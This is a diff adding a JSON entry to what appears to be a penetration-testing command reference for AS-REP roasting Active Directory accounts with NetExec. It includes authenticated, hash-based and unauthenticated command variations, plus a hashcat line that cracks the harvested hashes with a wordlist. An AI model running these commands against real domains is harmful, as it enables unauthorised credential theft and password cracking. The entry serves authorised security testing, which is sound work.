@@ -1,0 +1,22 @@
+{
+  "id": "nxc-ldap-asreproasting",
+  "name": "NetExec LDAP AS-REP Roasting",
+  "command": "nxc ldap <dc-ip> -u <user> -p <password> --asreproast <output.txt>",
+  "description": "Request AS-REP responses for every account with DONT_REQ_PREAUTH set and write hashes to a file ready for hashcat (-m 18200). Works without authentication if you supply '' for the password and have a valid user list.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "kerberos"],
+  "tags": ["nxc", "netexec", "asreproast", "preauth", "kerberos"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "nxc ldap <dc-ip> -u <user> -H <hash> --asreproast <output.txt>" },
+    { "label": "Unauthenticated With User List", "requires": "no-creds", "command": "nxc ldap <dc-ip> -u <users.txt> -p '' --asreproast <output.txt>" }
+  ],
+  "references": [
+    { "title": "NetExec — LDAP Protocol", "url": "https://www.netexec.wiki/ldap-protocol" },
+    { "title": "The Hacker Recipes — ASREProast", "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast" }
+  ],
+  "examples": [
+    "nxc ldap 10.10.10.10 -u jdoe -p 'Password123!' --asreproast asrep.txt",
+    "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+  ]
+}
